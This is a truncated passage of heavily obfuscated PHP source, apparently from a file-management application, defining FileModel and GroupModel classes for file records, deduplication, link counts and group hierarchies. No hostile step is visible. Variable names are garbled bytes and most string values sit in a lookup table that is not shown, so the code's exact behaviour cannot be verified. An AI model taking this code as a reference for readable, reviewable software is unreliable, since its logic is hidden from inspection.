eÖºµÆŒÙ: define($_SERVER[ˆûùúÊ¯][292], 3); define($_SERVER[ˆûùúÊ¯][293], 1); define($_SERVER[ˆûùúÊ¯][294], 0); goto FÖˆáƒß¾¦; BÛï³ŸÖåø: class FileModel extends ModelBase { protected $tableName = "\x69\x6f\137\x66\151\154\145"; protected $tableMeta = array("\x74\x61\x62\154\145\116\141\155\x65" => "\x69\157\x5f\x66\151\154\x65\137\155\x65\164\141", "\x6d\145\164\x61\x46\151\x65\x6c\144" => "\146\151\x6c\x65\111\x44"); public function fileInfo($æ—Ÿ™ş) { $ƒ’ ¹Ó” =& $_SERVER[ˆûùúÊ¯]; static $ôüÃ«˜ğ = array(); if (!isset($ôüÃ«˜ğ[$æ—Ÿ™ş])) { $úÏğÙ¨Ö = $ƒ’ ¹Ó”[1945]; $î»§£ò = Model($ƒ’ ¹Ó”[520])->field($úÏğÙ¨Ö)->where(array($ƒ’ ¹Ó”[518] => $æ—Ÿ™ş))->find(); $ôüÃ«˜ğ[$æ—Ÿ™ş] = $î»§£ò; } return $ôüÃ«˜ğ[$æ—Ÿ™ş]; } public function addFileByContent($ŸİÍØ‚ä = '', $íà³å¹Ò = '') { $Êì‹ó„ =& $_SERVER[ˆûùúÊ¯]; $”œ•†Òõ = TEMP_PATH . $Êì‹ó„[1946]; if (!is_dir($”œ•†Òõ)) { mk_dir($”œ•†Òõ); } $îØ†ˆ²§ = $”œ•†Òõ . $Êì‹ó„[1947] . rand_string(16); file_put_contents($îØ†ˆ²§, $ŸİÍØ‚ä); $¤œĞ”àƒ = $this->addFile($îØ†ˆ²§, $íà³å¹Ò, !0); if (file_exists($îØ†ˆ²§)) { @unlink($îØ†ˆ²§); } return $¤œĞ”àƒ; } public function createFileName($”¤©–Î, $ƒ­Å‹¨š = false, $„âÇç× = false) { $á¥‘ÕÖî =& $_SERVER[ˆûùúÊ¯]; $‘Ñ®·ªü = IO::init($á¥‘ÕÖî[8]); $¸ª€‹‘¡ = $this->makeFilePath($”¤©–Î, $‘Ñ®·ªü, $ƒ­Å‹¨š, $„âÇç×); $È¶Ê•£š = $‘Ñ®·ªü->pathFather($¸ª€‹‘¡); static $µŸé‹â = false; $å‡ú¸¯ = $á¥‘ÕÖî[1948] . md5($È¶Ê•£š); if (!$µŸé‹â && !Cache::get($å‡ú¸¯)) { $µŸé‹â = !0; $ºØ××êá = IO::mkdir($È¶Ê•£š); if (!IO::exist($ºØ××êá . $á¥‘ÕÖî[857])) { IO::mkfile($ºØ××êá . $á¥‘ÕÖî[857]); } Cache::set($å‡ú¸¯, 1, 3600 * 2); } return $¸ª€‹‘¡; } public function makeFilePath($÷¬Úöüõ, $›¤ŞèÌä, $¨³êÉÍÕ = false, $„øš´Ê¡ = false) { $ÅĞªØüÎ =& $_SERVER[ˆûùúÊ¯]; $ë‹¡§”Ï = Model($ÅĞªØüÎ[830])->get($ÅĞªØüÎ[1949]); $—ŞÃø¡ = KodIO::defaultIO() . date($ÅĞªØüÎ[1950]); $›³º† = $—ŞÃø¡ . rand_string(5) . short_id(100); $÷¬Úöüõ = str_replace($ÅĞªØüÎ[8], $ÅĞªØüÎ[11], KodIO::clear($÷¬Úöüõ)); $µ¼‰Ì¾ª = $›¤ŞèÌä->ext($÷¬Úöüõ); if (!$÷¬Úöüõ) { $ë‹¡§”Ï = $ÅĞªØüÎ[1951]; } switch ($ë‹¡§”Ï) { case $ÅĞªØüÎ[1952]: $›³º† = $›³º† . $ÅĞªØüÎ[10] . $›¤ŞèÌä->ext($÷¬Úöüõ); if ($µ¼‰Ì¾ª == $ÅĞªØüÎ[1889]) { $›³º† .= $ÅĞªØüÎ[1267]; } break; case $ÅĞªØüÎ[1953]: $¥¾ “ß˜ = Model($ÅĞªØüÎ[830])->get($ÅĞªØüÎ[831]); $êé“€€ = substr(md5($ÅĞªØüÎ[832] . $¥¾ “ß˜ . date($ÅĞªØüÎ[808])), 0, 8); $ø¾ÕÁ = KodIO::defaultDriver(); $—ŞÃø¡ = $ÅĞªØüÎ[1298] . $ø¾ÕÁ[$ÅĞªØüÎ[451]] . $ÅĞªØüÎ[460] . date($ÅĞªØüÎ[1954]) . $êé“€€ . $ÅĞªØüÎ[8]; if ($µ¼‰Ì¾ª == $ÅĞªØüÎ[1889]) { $÷¬Úöüõ .= $ÅĞªØüÎ[1267]; } $ÏÈ—êæŠ = $ÅĞªØüÎ[1955] . $—ŞÃø¡ . $÷¬Úöüõ; CacheLock::lock($ÏÈ—êæŠ); $›³º† = $—ŞÃø¡ . $÷¬Úöüõ; if (IO::exist($—ŞÃø¡ . $÷¬Úöüõ)) { $ùñ¤ÉÃ€ = substr($÷¬Úöüõ, 0, strlen($÷¬Úöüõ) - strlen($µ¼‰Ì¾ª)); $şÁ¥¬ğå = $„øš´Ê¡ ? substr($„øš´Ê¡, 0, 5) : ($¨³êÉÍÕ ? substr($¨³êÉÍÕ, 0, 5) : rand_string(5)); $›³º† = $—ŞÃø¡ . $ùñ¤ÉÃ€ . $şÁ¥¬ğå . $ÅĞªØüÎ[10] . $µ¼‰Ì¾ª; } if (IO::isTypeObject($›³º†) && !IO::isUploadServer($›³º†)) { if (IO::exist($›³º†)) { return $›³º†; } $ øÁÛïÔ = IO::setContent($›³º†, $ÅĞªØüÎ[12]); if (!$ øÁÛïÔ) { show_json($ÅĞªØüÎ[1956], !1); } } CacheLock::unlock($ÏÈ—êæŠ); break; case $ÅĞªØüÎ[1951]: break; default: break; } return $›³º†; } public function addFileByRemote($šÏ¿÷½´, $ŒÑ»ıÈ©, $·²°í¡ï = array()) { $ÓÚ™ÏËŒ =& $_SERVER[ˆûùúÊ¯]; if (!IO::exist($šÏ¿÷½´)) { return !1; } $µ¯Ì§Š  = $·²°í¡ï[$ÓÚ™ÏËŒ[649]] ? $·²°í¡ï[$ÓÚ™ÏËŒ[649]] : $ÓÚ™ÏËŒ[12]; $«Ğš‡ÅÑ = IO::hashMd5($šÏ¿÷½´, $µ¯Ì§Š ); $™¶”â±á = KodIO::defaultDriver(); $ÌÇÑøÜÄ = array($ÓÚ™ÏËŒ[593] => IO::size($šÏ¿÷½´), $ÓÚ™ÏËŒ[1957] => 1, $ÓÚ™ÏËŒ[470] => $ŒÑ»ıÈ©, $ÓÚ™ÏËŒ[868] => $™¶”â±á[$ÓÚ™ÏËŒ[451]], $ÓÚ™ÏËŒ[471] => $šÏ¿÷½´, $ÓÚ™ÏËŒ[1958] => $·²°í¡ï[$ÓÚ™ÏËŒ[648]] ? $·²°í¡ï[$ÓÚ™ÏËŒ[648]] : IO::hashSimple($šÏ¿÷½´), $ÓÚ™ÏËŒ[1959] => $«Ğš‡ÅÑ ? $«Ğš‡ÅÑ : $µ¯Ì§Š ); if ($ÆÖ²†ÕÚ = $this->addFileCheckExist($ÌÇÑøÜÄ[$ÓÚ™ÏËŒ[648]], $ÌÇÑøÜÄ[$ÓÚ™ÏËŒ[649]], $ÌÇÑøÜÄ[$ÓÚ™ÏËŒ[86]])) { return $ÆÖ²†ÕÚ; } return $this->addFileData($ÌÇÑøÜÄ); } private function addFileData($…šù™¾Ì) { $Ê¹Ï³Áó =& $_SERVER[ˆûùúÊ¯]; if (!$…šù™¾Ì) { return !1; } $…šù™¾Ì[$Ê¹Ï³Áó[86]] = intval($…šù™¾Ì[$Ê¹Ï³Áó[86]]); if (!$…šù™¾Ì[$Ê¹Ï³Áó[86]] && strlen($…šù™¾Ì[$Ê¹Ï³Áó[648]]) > 32) { $…šù™¾Ì[$Ê¹Ï³Áó[86]] = intval(substr($…šù™¾Ì[$Ê¹Ï³Áó[648]], 32)); } $Ÿˆğ—Ù = $this->add($…šù™¾Ì); return $this->find($Ÿˆğ—Ù); } public function addFile($Àô¦ü×, $ÂĞ¤³Î¸, $Ó–ÈÊ‡Ô = false) { $ê‚ëëß =& $_SERVER[ˆûùúÊ¯]; $¸‡ß¨Ø¨ = IO::hashSimple($Àô¦ü×); $„ÙŸ”Ã = IO::size($Àô¦ü×); $€¹°Š‹ = $„ÙŸ”Ã <= 1024 * 1024 * 10 ? IO::hashMd5($Àô¦ü×) : $ê‚ëëß[12]; $„ß°Ñ«á = $ê‚ëëß[1960] . $¸‡ß¨Ø¨; CacheLock::lock($„ß°Ñ«á); if ($€¹°Š‹ && $¸‡ß¨Ø¨) { $í›®Àˆì = $this->addFileCheckExist($¸‡ß¨Ø¨, $€¹°Š‹, $„ÙŸ”Ã); if ($í›®Àˆì) { CacheLock::unlock($„ß°Ñ«á); return $í›®Àˆì; } } $ú‘«ôŞ× = $this->addFileMake($Àô¦ü×, $„ÙŸ”Ã, $¸‡ß¨Ø¨, $€¹°Š‹, $ÂĞ¤³Î¸, $Ó–ÈÊ‡Ô); $âÑ«Ë¿Ã = $this->addFileData($ú‘«ôŞ×); CacheLock::unlock($„ß°Ñ«á); if (!$€¹°Š‹ && $âÑ«Ë¿Ã) { $this->fileMd5Check($âÑ«Ë¿Ã); } return $âÑ«Ë¿Ã; } private function fileMd5Check($Šô¨ˆİı) { $âˆë†ç =& $_SERVER[ˆûùúÊ¯]; $Â¬äø¯ø = array($Šô¨ˆİı[$âˆë†ç[517]], $Šô¨ˆİı[$âˆë†ç[94]]); $ÍŠôš•˜ = $âˆë†ç[1961] . $Šô¨ˆİı[$âˆë†ç[94]]; $İºÌöôÑ = $âˆë†ç[1962] . $Šô¨ˆİı[$âˆë†ç[517]]; $Î”¿ÁÎ  = TaskQueue::add($âˆë†ç[1963], $Â¬äø¯ø, $ÍŠôš•˜, $İºÌöôÑ); if (!$Î”¿ÁÎ ) { $this->fileMd5Set($Šô¨ˆİı[$âˆë†ç[517]], $Šô¨ˆİı[$âˆë†ç[94]]); } else { TaskQueue::addSubmit(); } } public function fileMd5Set($ÒõÙèÏ‡, $Ú‚•íØú) { $´íé°Êì =& $_SERVER[ˆûùúÊ¯]; $„ÛÛ¾šÌ = $this->find($ÒõÙèÏ‡); if (!$„ÛÛ¾šÌ || $„ÛÛ¾šÌ[$´íé°Êì[649]]) { return; } $¼¦ÜÑ—Î = IO::hashMd5($Ú‚•íØú); if (!$¼¦ÜÑ—Î) { return $´íé°Êì[12]; } $this->where(array($´íé°Êì[517] => $ÒõÙèÏ‡))->save(array($´íé°Êì[649] => $¼¦ÜÑ—Î)); } public function addFileMake($¸›µöû£, $…Á¸Şû§, $üò°«¥†, $ƒÇ’áõÒ, $õ×¬é•ô, $„€ğƒŠ¡) { $§›âıÓ• =& $_SERVER[ˆûùúÊ¯]; $©«ÍóÏ³ = $this->createFileName($õ×¬é•ô, $üò°«¥†, $ƒÇ’áõÒ); $ŒîçäÚ… = get_path_father($©«ÍóÏ³); $Ÿ…±è˜Š = get_path_this($©«ÍóÏ³); if ($„€ğƒŠ¡) { $²¦€éğê = IO::move($¸›µöû£, $ŒîçäÚ…, !1, $Ÿ…±è˜Š); } else { $²¦€éğê = IO::copy($¸›µöû£, $ŒîçäÚ…, !1, $Ÿ…±è˜Š); } if (!$²¦€éğê) { return !1; } $ğûî¦â¾ = KodIO::defaultDriver(); $öûóËî = array($§›âıÓ•[593] => $…Á¸Şû§, $§›âıÓ•[1957] => 1, $§›âıÓ•[470] => $õ×¬é•ô, $§›âıÓ•[868] => $ğûî¦â¾[$§›âıÓ•[451]], $§›âıÓ•[471] => $©«ÍóÏ³, $§›âıÓ•[1958] => $üò°«¥†, $§›âıÓ•[1959] => $ƒÇ’áõÒ); return $öûóËî; } public function addFileCheckExist($š±–öâ¢, $ƒœ£–¹, $¹¼Â¹€ ) { $„–øÙé° =& $_SERVER[ˆûùúÊ¯]; $ù¯‹á€Ú = $this->findByHash($š±–öâ¢, $ƒœ£–¹); if (!$ù¯‹á€Ú) { return !1; } $ö‚ôÎÒ = array($„–øÙé°[1957] => intval($ù¯‹á€Ú[$„–øÙé°[1964]]) + 1, $„–øÙé°[593] => $¹¼Â¹€ ); $this->where(array($„–øÙé°[518] => $ù¯‹á€Ú[$„–øÙé°[517]]))->save($ö‚ôÎÒ); return $ù¯‹á€Ú; } public function remove($‘Ó°¿í) { $this->linkCountChange($‘Ó°¿í, !1); $this->clearEmpty(); return !0; } public function linkAdd($Í”ÆÇ¤) { $this->linkCountChange($Í”ÆÇ¤, !0); } public function linkCountChange($†Àº´‹á, $®·…×±ˆ) { $ô µ¼î =& $_SERVER[ˆûùúÊ¯]; if (!$†Àº´‹á) { return; } if (!is_array($†Àº´‹á)) { $†Àº´‹á = array($†Àº´‹á); } $İ…Ê“¤§ = array(); foreach ($†Àº´‹á as $²ôÖ¦Ó) { $ÙÉÚïÑö = $²ôÖ¦Ó . $ô µ¼î[12]; if (!$İ…Ê“¤§[$ÙÉÚïÑö]) { $İ…Ê“¤§[$ÙÉÚïÑö] = 0; } $İ…Ê“¤§[$ÙÉÚïÑö]++; } $ö•ıÓ¸¥ = array(); foreach ($İ…Ê“¤§ as $²ôÖ¦Ó => $Â¾ ’) { $ÙÉÚïÑö = $Â¾ ’ . $ô µ¼î[12]; if (!$ö•ıÓ¸¥[$ÙÉÚïÑö]) { $ö•ıÓ¸¥[$ÙÉÚïÑö] = array(); } $ö•ıÓ¸¥[$ÙÉÚïÑö][] = $²ôÖ¦Ó; } foreach ($ö•ıÓ¸¥ as $Â¾ ’ => $¸…çÈò) { if (!$¸…çÈò) { continue; } $Â¾ ’ = $®·…×±ˆ ? $Â¾ ’ : -intval($Â¾ ’); $œ”´¥´ä = array($ô µ¼î[517] => array($ô µ¼î[7], $¸…çÈò)); if ($Â¾ ’ < 0) { $œ”´¥´ä[$ô µ¼î[1964]] = array($ô µ¼î[1076], abs($Â¾ ’)); } $this->where($œ”´¥´ä)->setAdd($ô µ¼î[1964], $Â¾ ’); } } public function findByHash($Íò†¸¨·, $¾Äµ‡Ïö = false) { $ïØÅÅíä =& $_SERVER[ˆûùúÊ¯]; if (!$Íò†¸¨· && !$¾Äµ‡Ïö) { return !1; } $×ä¢ä¦È = array($ïØÅÅíä[1958] => $Íò†¸¨·); if ($¾Äµ‡Ïö) { $×ä¢ä¦È = array($ïØÅÅíä[1959] => $¾Äµ‡Ïö); } return $this->order($ïØÅÅíä[1965])->where($×ä¢ä¦È)->find(); } public function clearEmpty($Şƒ‡†äı = 0) { $‚óşÖ¿Ï =& $_SERVER[ˆûùúÊ¯]; $·–ã¥Úà = time() - 3600 * 24 * $Şƒ‡†äı; $€”–ÁäÌ = $‚óşÖ¿Ï[1966] . $·–ã¥Úà; $ÂêŒ•Ä = $this->where($€”–ÁäÌ)->select(); if (!$ÂêŒ•Ä) { return; } $¤ºİó¸Á = new Task($‚óşÖ¿Ï[1967], $‚óşÖ¿Ï[12], count($ÂêŒ•Ä)); foreach ($ÂêŒ•Ä as $üáİ¦¾º) { $¤ºİó¸Á->update(1); $this->resetFile($üáİ¦¾º); } $¤ºİó¸Á->end(); } public function resetFile($Ÿ·¬×—ı) { $æÏ…Á˜ =& $_SERVER[ˆûùúÊ¯]; $¡¦â•ğã = array($æÏ…Á˜[518] => $Ÿ·¬×—ı[$æÏ…Á˜[517]]); $»µËË€ = Model($æÏ…Á˜[1393])->where($¡¦â•ğã)->count(); $Ã›æ«Ù” = Model($æÏ…Á˜[1968])->where($¡¦â•ğã)->count(); $êì¨› = intval($»µËË€) + intval($Ã›æ«Ù”); if ($êì¨› == 0) { IO::remove($Ÿ·¬×—ı[$æÏ…Á˜[94]]); Model($æÏ…Á˜[1969])->delete($Ÿ·¬×—ı[$æÏ…Á˜[517]]); $this->where($¡¦â•ğã)->delete(); $this->metaSet($Ÿ·¬×—ı[$æÏ…Á˜[517]], null, null); return; } if ($Ÿ·¬×—ı[$æÏ…Á˜[1964]] != $êì¨›) { $this->where($¡¦â•ğã)->save(array($æÏ…Á˜[1957] => $êì¨›)); } } public function storageInfo($ò®—ø¢ï = false) { $ºªŠÆÕ® =& $_SERVER[ˆûùúÊ¯]; $º£À­© = $this->count() + 0.0; $››€¿Ï˜ = 0; $—‰üØÃ = 1; $Ÿ¿ïò‘Î = 0; $ª¹íÀÚÒ = 5000; for ($üğ å = 0; $üğ å < $º£À­©; $üğ å = $üğ å + $ª¹íÀÚÒ) { $úïÀóŞ„ = $this->limit($üğ å, $üğ å + $ª¹íÀÚÒ)->select(); foreach ($úïÀóŞ„ as $¦›øö”æ) { $—‰üØÃ += $¦›øö”æ[$ºªŠÆÕ®[86]] * $¦›øö”æ[$ºªŠÆÕ®[1964]]; $››€¿Ï˜ += $¦›øö”æ[$ºªŠÆÕ®[86]] * ($¦›øö”æ[$ºªŠÆÕ®[1964]] - 1); $Ÿ¿ïò‘Î += $¦›øö”æ[$ºªŠÆÕ®[1964]]; } } $€§ºÍôê = array($ºªŠÆÕ®[1970] => $—‰üØÃ, $ºªŠÆÕ®[1971] => $››€¿Ï˜, $ºªŠÆÕ®[1972] => $››€¿Ï˜ / $—‰üØÃ, $ºªŠÆÕ®[90] => $º£À­©, $ºªŠÆÕ®[1973] => $Ÿ¿ïò‘Î); return $€§ºÍôê; } } class GroupModel extends ModelBase { protected $tableName = "\x67\162\x6f\165\160"; protected $tableMeta = array("\x74\141\142\x6c\145\x4e\x61\x6d\x65" => "\x67\162\157\165\160\137\155\145\164\x61", "\155\145\164\x61\x46\x69\x65\154\x64" => "\x67\162\157\165\160\111\x44"); protected function cacheFunctionAlias($ÕÏÚ‘Î™) { $¿•—¢Û =& $_SERVER[ˆûùúÊ¯]; return array($¿•—¢Û[1974] => array($ÕÏÚ‘Î™[0], $¿•—¢Û[1975]), $¿•—¢Û[1976] => array($ÕÏÚ‘Î™[0], $¿•—¢Û[1977])); } protected function getInfo($ûôÔˆÍÀ, $»‹£¦Ôà = false) { $ »Ş˜ø = $this->getInfoSimple($ûôÔˆÍÀ); if (!$ »Ş˜ø) { return !1; } if ($»‹£¦Ôà) { return $this->_listDataApplyItem($ »Ş˜ø); } return $this->cacheFunctionGet($_SERVER[ˆûùúÊ¯][1978], $ûôÔˆÍÀ); } protected function getInfoSimple($é€ê²¶í, $Ñø·ã¥å = false) { $ÚÏäÄ¨ =& $_SERVER[ˆûùúÊ¯]; if ($Ñø·ã¥å) { $™Î«šÀÌ = array($ÚÏäÄ¨[1896] => intval($é€ê²¶í)); $Úû›¨Š = $this->where($™Î«šÀÌ)->find(); return is_array($Úû›¨Š) ? $Úû›¨Š : array(); } return $this->cacheFunctionGet($ÚÏäÄ¨[1979], $é€ê²¶í); } protected function groupAdd($Áœ¾„¢ì) { $õ‰÷Ï° =& $_SERVER[ˆûùúÊ¯]; if (!$Áœ¾„¢ì[$õ‰÷Ï°[189]] && isset($Áœ¾„¢ì[$õ‰÷Ï°[1896]]) && $Áœ¾„¢ì[$õ‰÷Ï°[1896]] == 1) { if ($ƒÙßïä = $this->getInfoSimple($Áœ¾„¢ì[$õ‰÷Ï°[1896]], !0)) { return $Áœ¾„¢ì[$õ‰÷Ï°[1896]]; } } else { $ƒÙßïä = $this->getInfoSimple($Áœ¾„¢ì[$õ‰÷Ï°[189]]); if (!$ƒÙßïä) { return !1; } } $Âé×ø¬ = $õ‰÷Ï°[571]; if ($ƒÙßïä[$õ‰÷Ï°[561]]) { $Âé×ø¬ = $ƒÙßïä[$õ‰÷Ï°[561]] . $ƒÙßïä[$õ‰÷Ï°[1896]] . $õ‰÷Ï°[60]; } $¶°ÂÈ²‚ = array($õ‰÷Ï°[470] => $this->groupNameAuto($Áœ¾„¢ì[$õ‰÷Ï°[189]], $Áœ¾„¢ì[$õ‰÷Ï°[42]]), $õ‰÷Ï°[453] => $Áœ¾„¢ì[$õ‰÷Ï°[189]], $õ‰÷Ï°[628] => $Âé×ø¬, $õ‰÷Ï°[1980] => $Áœ¾„¢ì[$õ‰÷Ï°[1883]], $õ‰÷Ï°[1981] => 0, $õ‰÷Ï°[1900] => 0); if (isset($Áœ¾„¢ì[$õ‰÷Ï°[1920]])) { $¶°ÂÈ²‚[$õ‰÷Ï°[1920]] = $Áœ¾„¢ì[$õ‰÷Ï°[1920]]; } else { $«€ô¦´¼ = $this->max($õ‰÷Ï°[1920]); if (!$«€ô¦´¼) { $«€ô¦´¼ = 0; } $¶°ÂÈ²‚[$õ‰÷Ï°[1920]] = $«€ô¦´¼ + 1; } if (!empty($Áœ¾„¢ì[$õ‰÷Ï°[1896]])) { $¶°ÂÈ²‚[$õ‰÷Ï°[1896]] = $Áœ¾„¢ì[$õ‰÷Ï°[1896]]; } $†¡åŒ˜ª = $this->add($¶°ÂÈ²‚); $this->setNamePinyin($†¡åŒ˜ª, $¶°ÂÈ²‚[$õ‰÷Ï°[42]]); if (isset($Áœ¾„¢ì[$õ‰÷Ï°[1982]])) { $this->metaSet($†¡åŒ˜ª, array($õ‰÷Ï°[1982] => $Áœ¾„¢ì[$õ‰÷Ï°[1982]], $õ‰÷Ï°[1983] => $Áœ¾„¢ì[$õ‰÷Ï°[1983]])); unset($Áœ¾„¢ì[$õ‰÷Ï°[1982]]); unset($Áœ¾„¢ì[$õ‰÷Ï°[1983]]); } Model($õ‰÷Ï°[1393])->groupRootAdd($†¡åŒ˜ª); $this->_clearCache($Áœ¾„¢ì[$õ‰÷Ï°[189]]); return $†¡åŒ˜ª; } protected function groupEdit($ëà‹, $Ì¯Ş®) { $‡·…°üï =& $_SERVER[ˆûùúÊ¯]; $Ç‚Çâ°ù = $this->getInfoSimple($ëà‹); if (!$Ç‚Çâ°ù) { return !1; } if (!empty($Ì¯Ş®[$‡·…°üï[189]])) { $²Ê«“ÎÂ = $this->getInfoSimple($Ì¯Ş®[$‡·…°üï[189]]); if (!$²Ê«“ÎÂ) { return !1; } if ($Ç‚Çâ°ù[$‡·…°üï[1896]] == $²Ê«“ÎÂ[$‡·…°üï[1896]]) { return !1; } if ($Ì¯Ş®[$‡·…°üï[189]] != $Ç‚Çâ°ù[$‡·…°üï[189]]) { if ($²Ê«“ÎÂ[$‡·…°üï[561]] !== $Ç‚Çâ°ù[$‡·…°üï[561]] && strpos($²Ê«“ÎÂ[$‡·…°üï[561]], $Ç‚Çâ°ù[$‡·…°üï[561]] . $Ç‚Çâ°ù[$‡·…°üï[1896]] . $‡·…°üï[60]) === 0) { return !1; } $Ì¯Ş®[$‡·…°üï[628]] = $²Ê«“ÎÂ[$‡·…°üï[561]] . $Ì¯Ş®[$‡·…°üï[189]] . $‡·…°üï[60]; $this->_changeChildLevel($Ç‚Çâ°ù, $²Ê«“ÎÂ); $this->_clearCache($²Ê«“ÎÂ[$‡·…°üï[1896]]); $this->_clearCache($Ç‚Çâ°ù[$‡·…°üï[189]]); } } if (isset($Ì¯Ş®[$‡·…°üï[42]])) { $this->setNamePinyin($ëà‹, $Ì¯Ş®[$‡·…°üï[42]]); } if (isset($Ì¯Ş®[$‡·…°üï[1982]])) { $this->metaSet($ëà‹, array($‡·…°üï[1982] => $Ì¯Ş®[$‡·…°üï[1982]], $‡·…°üï[1983] => $Ì¯Ş®[$‡·…°üï[1983]])); unset($Ì¯Ş®[$‡·…°üï[1982]]); unset($Ì¯Ş®[$‡·…°üï[1983]]); } $this->_clearChildrenCache($Ç‚Çâ°ù); return $this->where(array($‡·…°üï[1984] => $ëà‹))->save($Ì¯Ş®); } private function _clearChildrenCache($ƒä“ÆÕ) { $õéÔ¼¡ =& $_SERVER[ˆûùúÊ¯]; $„ë“Ù = array($õéÔ¼¡[628] => array($õéÔ¼¡[588], $ƒä“ÆÕ[$õéÔ¼¡[561]] . $ƒä“ÆÕ[$õéÔ¼¡[1896]] . $õéÔ¼¡[589])); $ŞÁ•ß€¨ = $this->field($õéÔ¼¡[1896])->where($„ë“Ù)->select(); foreach ($ŞÁ•ß€¨ as $Ù°—†…ü) { $this->_clearCache($Ù°—†…ü[$õéÔ¼¡[1896]]); } } private function _clearCache($Ô±ÊÇ) { $ÏìÇªùö =& $_SERVER[ˆûùúÊ¯]; $this->cacheFunctionClear($ÏìÇªùö[1978], $Ô±ÊÇ); $this->cacheFunctionClear($ÏìÇªùö[1979], $Ô±ÊÇ); } private function _changeChildLevel($ñ¤óş“á, $êÕ¨”², $à¬‚—ñÕ = false) { $æĞÚ…”Ï =& $_SERVER[ˆûùúÊ¯]; $ó¢”Õ“ä = $ñ¤óş“á[$æĞÚ…”Ï[561]] . $ñ¤óş“á[$æĞÚ…”Ï[1896]] . $æĞÚ…”Ï[60]; $¥ºœº = $êÕ¨”²[$æĞÚ…”Ï[561]] . $êÕ¨”²[$æĞÚ…”Ï[1896]] . $æĞÚ…”Ï[60] . $ñ¤óş“á[$æĞÚ…”Ï[1896]] . $æĞÚ…”Ï[60]; if ($à¬‚—ñÕ) { $¥ºœº = $êÕ¨”²[$æĞÚ…”Ï[561]] . $êÕ¨”²[$æĞÚ…”Ï[1896]] . $æĞÚ…”Ï[60]; } $€Â¸Ã² = array($æĞÚ…”Ï[628] => array($æĞÚ…”Ï[588], $ñ¤óş“á[$æĞÚ…”Ï[561]] . $ñ¤óş“á[$æĞÚ…”Ï[1896]] . $æĞÚ…”Ï[589])); $ÌëØæî = array($æĞÚ…”Ï[628] => array($æĞÚ…”Ï[637], "\x72\x65\160\x6c\141\x63\x65\x28\160\x61\162\x65\x6e\x74\x4c\145\x76\x65\x6c\x2c\x27{$ó¢”Õ“ä}\47\x2c\x27{$¥ºœº}\x27\51")); $this->_clearChildrenCache($ñ¤óş“á); $this->where($€Â¸Ã²)->data($ÌëØæî)->save(); } public function setNamePinyin($ø—•Ñ±ş, $ªµ±…´‚ = false) { $êß‘›üş =& $_SERVER[ˆûùúÊ¯]; if (!$ªµ±…´‚) { $Ç×ß›æş = $this->getInfoSimple($ø—•Ñ±ş); $ªµ±…´‚ = $Ç×ß›æş[$êß‘›üş[42]]; } if (!Input::check($ªµ±…´‚, $êß‘›üş[631])) { $this->metaSet($ø—•Ñ±ş, $êß‘›üş[514], null); $this->metaSet($ø—•Ñ±ş, $êß‘›üş[513], null); return; } $¯ÅÂ£Å = array($êß‘›üş[514] => str_replace($êß‘›üş[63], $êß‘›üş[12], Pinyin::get($ªµ±…´‚)), $êß‘›üş[513] => Pinyin::get($ªµ±…´‚, $êß‘›üş[632])); $this->metaSet($ø—•Ñ±ş, $¯ÅÂ£Å); } protected function groupStatus($†š¡Å„ó, $£©êÜü§) { $‡ŠÏ’ =& $_SERVER[ˆûùúÊ¯]; $çËğˆüÎ = $this->getInfoSimple($†š¡Å„ó); if (!$çËğˆüÎ) { return !1; } if ($£©êÜü§ == $‡ŠÏ’[98]) { $úçñé‰ = $this->parentLevelArray($çËğˆüÎ[$‡ŠÏ’[561]]); } else { $Ñû·¿Àê = array($‡ŠÏ’[628] => array($‡ŠÏ’[588], $çËğˆüÎ[$‡ŠÏ’[561]] . $çËğˆüÎ[$‡ŠÏ’[1896]] . $‡ŠÏ’[589])); $úçñé‰ = $this->where($Ñû·¿Àê)->field($‡ŠÏ’[1896])->select(); $úçñé‰ = array_to_keyvalue($úçñé‰, $‡ŠÏ’[12], $‡ŠÏ’[1896]); } $úçñé‰[] = $çËğˆüÎ[$‡ŠÏ’[1896]]; $·–‘Šåœ = array(); foreach ($úçñé‰ as $†š¡Å„ó) { $·–‘Šåœ[] = array($‡ŠÏ’[1896] => $†š¡Å„ó, $‡ŠÏ’[104] => $‡ŠÏ’[810], $‡ŠÏ’[426] => $£©êÜü§); $this->_clearCache($†š¡Å„ó); } return Model($‡ŠÏ’[1985])->addAll($·–‘Šåœ, array(), !0); } protected function groupRemove($‡»”ôã½, $´›«é»Ê = false) { $õñ¼ÌÕğ =& $_SERVER[ˆûùúÊ¯]; $‚­‘°®× = array($õñ¼ÌÕğ[1896] => $‡»”ôã½); $˜¼Ÿ¤ı = $this->where($‚­‘°®×)->find(); if (!$˜¼Ÿ¤ı || $˜¼Ÿ¤ı[$õñ¼ÌÕğ[189]] == 0) { return !1; } if (!$´›«é»Ê) { $¸¦†’äñ = $this->getInfoSimple($˜¼Ÿ¤ı[$õñ¼ÌÕğ[189]]); $this->_changeChildLevel($˜¼Ÿ¤ı, $¸¦†’äñ, !0); $this->where(array($õñ¼ÌÕğ[189] => $‡»”ôã½))->save(array($õñ¼ÌÕğ[189] => $˜¼Ÿ¤ı[$õñ¼ÌÕğ[189]])); $this->_clearCache($¸¦†’äñ[$õñ¼ÌÕğ[1896]]); } Model($õñ¼ÌÕğ[1985])->where($‚­‘°®×)->delete(); Model($õñ¼ÌÕğ[1986])->where($‚­‘°®×)->delete(); Model($õñ¼ÌÕğ[885])->groupRootRemove($‡»”ôã½); $this->_clearCache($˜¼Ÿ¤ı[$õñ¼ÌÕğ[189]]); return $this->where($‚­‘°®×)->delete(); } protected function groupSort($¢á—‹ú•) { $Ó¦”Æ°Á =& $_SERVER[ˆûùúÊ¯]; $ è˜Œ ş = array(); foreach ($¢á—‹ú• as $·×ŠØÂÇ => $ìË¢Ë”ì) { $ è˜Œ ş[] = array($Ó¦”Æ°Á[1896], $ìË¢Ë”ì, $Ó¦”Æ°Á[1920], $·×ŠØÂÇ + 1); } $this->saveAll($ è˜Œ ş); } public function listData() { $á“Ì™ô’ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($á“Ì™ô’[$_SERVER[ˆûùúÊ¯][421]]); return $á“Ì™ô’; } private function _makeOrder($·ïÄİğ¨ = '') { $òœ¶ıÒÀ =& $_SERVER[ˆûùúÊ¯]; $×¶üˆÖ“ = array($òœ¶ıÒÀ[1896], $òœ¶ıÒÀ[42], $òœ¶ıÒÀ[1885], $òœ¶ıÒÀ[224]); $ÅİùØñÄ = array($òœ¶ıÒÀ[499] => $òœ¶ıÒÀ[500], $òœ¶ıÒÀ[501] => $òœ¶ıÒÀ[502]); $ßå¢ÔÛ‡ = Input::get($òœ¶ıÒÀ[506], $òœ¶ıÒÀ[7], 